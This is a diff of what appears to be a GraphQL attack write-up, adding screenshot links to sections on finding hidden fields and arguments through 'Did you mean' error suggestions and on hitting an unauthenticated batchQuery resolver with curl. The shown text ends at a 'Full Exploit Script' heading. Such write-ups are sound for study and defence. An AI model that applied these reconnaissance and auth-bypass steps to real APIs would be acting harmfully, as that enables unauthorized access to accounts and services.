@@ -151,6 +151,9 @@ done
   batchQueery → batchQuery
 ```
 
+<img width="1255" height="1021" alt="image" src="https://github.com/user-attachments/assets/ece507a9-8cf7-47e1-9341-1baea03737ec" />
+
+
 **Key discovery:** `batchQuery`, `systemAccounts`, `internalServices` are all real fields.
 
 ### 2.3 — Reconstruct Field Arguments via Suggestions
@@ -167,6 +170,9 @@ Response:
 {"errors": [{"message": "Unknown argument 'query' on field 'Query.batchQuery'. Did you mean 'queries'?"}]}
 ```
 
+<img width="1512" height="653" alt="image" src="https://github.com/user-attachments/assets/fdd5310d-6812-43cc-808b-6139430ee028" />
+
+
 The argument is `queries` (plural) and it's a list. Try:
 
 ```bash
@@ -176,6 +182,8 @@ curl -s -X POST http://203.x.x.x:4000/graphql \
 ```
 
 **This succeeds — NO authentication required.** The `batchQuery` resolver has no auth check.
+
+<img width="1104" height="396" alt="image" src="https://github.com/user-attachments/assets/9b18bfbe-4eae-43ef-bf67-ba636c7b7819" />
 
 ---
 
@@ -215,6 +223,9 @@ curl -s -X POST http://203.x.x.x:4000/graphql \
   }
 }
 ```
+<img width="1304" height="977" alt="image" src="https://github.com/user-attachments/assets/428ef10b-249f-487a-b503-7a0b8ab14915" />
+
+<img width="1451" height="1032" alt="image" src="https://github.com/user-attachments/assets/cdd1a1ca-8f1f-4805-b2df-ba70c3b7e220" />
 
 ### 3.2 — Full Exploit Script
 
